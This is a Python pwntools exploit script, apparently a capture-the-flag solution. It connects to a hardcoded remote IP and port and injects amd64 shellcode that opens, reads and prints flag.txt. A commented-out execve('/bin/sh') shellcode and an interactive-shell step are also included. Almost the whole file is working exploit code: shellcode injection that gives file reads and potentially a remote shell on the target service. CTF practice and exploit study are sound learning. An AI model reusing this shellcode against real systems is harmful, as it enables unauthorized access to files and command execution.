#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
exe = ELF("./challengee")
# context.log_level='debug'
# while True:
p = remote("152.69.210.130", 3002)
# p = remote("127.0.0.1", 3002)
# p = process([exe.path])
def gdbs():
    context.terminal = ["foot"]
    gdb.attach(p, gdbscript="""

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
# gdbs()
# input()
shellcode = asm("""
                syscall
                """,arch="amd64")
sla(">",shellcode)
# shellcode = asm(f"""
#                 mov rdi, {u64("/bin/sh\0")}
#                 push rdi
#                 mov rdi,rsp
#                 xor rsi,rsi
#                 xor rdx,rdx
#                 mov rax,0x3b
#                 syscall
#                 """,arch="amd64")
flagname = b"flag.txt\0"
buffer = flagname
chunk_size = 8
chunks = [buffer[i:i + chunk_size] for i in range(0, len(buffer), chunk_size)]
inst = "mov rdi,0\npush rdi\n"
for i in range(len(chunks)):
    inst += f"mov rdi,{u64(chunks[len(chunks)-i-1].ljust(8,b"\0").ljust(8,b"\0"))}\n"+f"push rdi\n"
log.info(f"{inst = }")
shellcode = asm(f"""
                mov rax,0x2
                {inst}
                mov rdi,rsp
                xor rsi,rsi
                mov rdx,777
                syscall
                lea rsi,[rsp+0x100]
                mov rdi,rax
                mov rax,0
                mov rdx,0x100
                syscall
                mov rdi,1
                mov rax,1
                mov rdx,0x100
                syscall

                """,arch="amd64")
input()
sl(b"a"*2+shellcode)
    # try:
    #     sl("lmaobrub")
    #     p.recvuntil("lmaobrub")
    #     sl("cat flag.txt")
    #     p.interactive()
    #     break
    # except:
    #     pass







p.interactive()
# good luck pwning :)

